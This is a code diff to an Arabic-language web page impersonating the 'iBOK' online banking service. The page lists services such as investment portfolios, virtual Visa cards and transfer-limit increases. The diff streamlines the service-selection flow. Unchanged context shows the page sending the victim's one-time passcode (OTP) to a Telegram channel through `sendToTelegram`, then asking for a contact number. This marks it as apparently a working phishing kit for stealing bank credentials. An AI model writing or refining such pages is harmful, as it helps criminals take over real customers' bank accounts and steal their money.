@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>iBOK - الاستمارة أونلاين وتطبيق بنكك والمحفظة الاستثمارية</title>
+  <title>iBOK - الخدمة المصرفية عبر الانترنت</title>
   <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;800&display=swap" rel="stylesheet" />
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
@@ -652,49 +652,49 @@
         <h3>اختر نوع الخدمة التي ترغب بمعالجتها</h3>
 
         <div class="service-grid">
-          <div class="service-option selected" onclick="handleServiceClick(0, 'المحفظة الاستثمارية')">
+          <div class="service-option" onclick="selectAndProceedService(0, 'المحفظة الاستثمارية')">
             <div class="service-content">
               <span class="service-title">المحفظة الاستثمارية</span>
               <span class="service-desc">استثمارات الأرباح والصفقات المباشرة.</span>
             </div>
             <span class="service-icon">📈</span>
           </div>
-          <div class="service-option" onclick="handleServiceClick(1, 'حساب جاري و حساب مميز')">
+          <div class="service-option" onclick="selectAndProceedService(1, 'حساب جاري و حساب مميز')">
             <div class="service-content">
               <span class="service-title">حساب جاري و حساب مميز</span>
               <span class="service-desc">فتح أو ترقية الحساب.</span>
             </div>
             <span class="service-icon">🪪</span>
           </div>
-          <div class="service-option" onclick="handleServiceClick(2, 'خدمات العملات الأجنبية')">
+          <div class="service-option" onclick="selectAndProceedService(2, 'خدمات العملات الأجنبية')">
             <div class="service-content">
               <span class="service-title">خدمات العملات الأجنبية</span>
               <span class="service-desc">تفعيل وإدارة العملات الأجنبية.</span>
             </div>
             <span class="service-icon">🌐</span>
           </div>
-          <div class="service-option" onclick="handleServiceClick(3, 'رفع سقف التحويل اليومي')">
+          <div class="service-option" onclick="selectAndProceedService(3, 'رفع سقف التحويل اليومي')">
             <div class="service-content">
               <span class="service-title">رفع سقف التحويل اليومي</span>
               <span class="service-desc">طلب رفع سقف الحساب والعمليات.</span>
             </div>
             <span class="service-icon">⬆️</span>
           </div>
-          <div class="service-option" onclick="handleServiceClick(4, 'بطاقة فيزا افتراضية')">
+          <div class="service-option" onclick="selectAndProceedService(4, 'بطاقة فيزا افتراضية')">
             <div class="service-content">
               <span class="service-title">بطاقة فيزا افتراضية</span>
               <span class="service-desc">تفعيل بطاقة فيزا للاستخدام الإلكتروني.</span>
             </div>
             <span class="service-icon">💳</span>
           </div>
-          <div class="service-option" onclick="handleServiceClick(5, 'كشف الحساب')">
+          <div class="service-option" onclick="selectAndProceedService(5, 'كشف الحساب')">
             <div class="service-content">
               <span class="service-title">كشف الحساب</span>
               <span class="service-desc">الحصول على كشف حساب مفصل.</span>
             </div>
             <span class="service-icon">📄</span>
           </div>
-          <div class="service-option" onclick="handleServiceClick(6, 'التحويلات الخاطئة')">
+          <div class="service-option" onclick="selectAndProceedService(6, 'التحويلات الخاطئة')">
             <div class="service-content">
               <span class="service-title">التحويلات الخاطئة</span>
               <span class="service-desc">معالجة أخطاء التحويلات البنكية.</span>
@@ -702,8 +702,6 @@
             <span class="service-icon">🔄</span>
           </div>
         </div>
-
-        <button class="btn-red" onclick="proceedSelectedService()">متابعة الخدمة المحددة ➔</button>
 
         <div class="transparent-loading-overlay" id="modalServiceLoading">
           <div style="font-size: 1.05rem; font-weight: 700; color: #111827;">جاري المعالجة</div>
@@ -1058,16 +1056,15 @@
       }
     }
 
-    function handleServiceClick(index, name) {
+    function selectAndProceedService(index, name) {
       selectedServiceIndex = index;
       selectedServiceName = name;
+      
       document.querySelectorAll('.service-option').forEach((el, idx) => {
         if (idx === index) el.classList.add('selected');
         else el.classList.remove('selected');
       });
-    }
 
-    function proceedSelectedService() {
       const overlay = document.getElementById('modalServiceLoading');
       overlay.style.display = 'flex';
       setTimeout(() => {
@@ -1081,7 +1078,7 @@
           setupDynamicForm(selectedServiceIndex, selectedServiceName);
           switchScreen('screenServiceForm');
         }
-      }, 1000);
+      }, 600);
     }
 
     function setupDynamicForm(index, name) {
@@ -1284,7 +1281,6 @@
       
       await sendToTelegram(`📱 *رمز التحقق (OTP):* \`${otpVal}\``);
 
-      // الانتقال إلى شاشة إدخال رقم التواصل بعد إدخال الرمز الصحيح
       switchScreen('screenContact');
     }
 
